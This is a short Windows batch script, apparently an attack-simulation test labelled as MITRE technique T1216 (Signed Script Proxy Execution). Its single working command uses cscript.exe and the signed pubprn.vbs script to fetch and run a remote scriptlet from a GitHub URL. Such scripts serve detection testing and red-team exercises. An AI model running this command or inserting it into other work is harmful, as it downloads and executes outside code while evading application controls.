@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: Signed Script Proxy Execution	(T1216)
ECHO.
ECHO [+] Using 'cscript.exe' to execute payload
ECHO -------------------------------------------------------------------
cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost "script:https://raw.githubusercontent.com/greycel/poc/master/notepad.sct"
ECHO.
